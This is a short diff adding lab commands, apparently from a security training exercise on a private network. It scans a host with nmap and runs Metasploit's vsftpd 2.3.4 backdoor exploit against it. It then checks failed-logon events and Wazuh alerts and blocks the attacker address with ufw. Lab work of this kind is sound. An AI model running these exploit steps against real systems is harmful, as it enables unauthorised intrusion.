@@ -1,0 +1,12 @@
+nmap -sV 192.168.111.129
+msfconsole
+search samba
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.111.129
+run
+wevtutil qe Security /q:"*[System[(EventID=4625)]]" /c:5 /rd:true /f:text
+sudo systemctl status wazuh-manager
+sudo grep -i "4625" /var/ossec/logs/alerts/alerts.log
+sudo ufw enable
+sudo ufw deny from 192.168.111.130
+sudo ufw status numbered
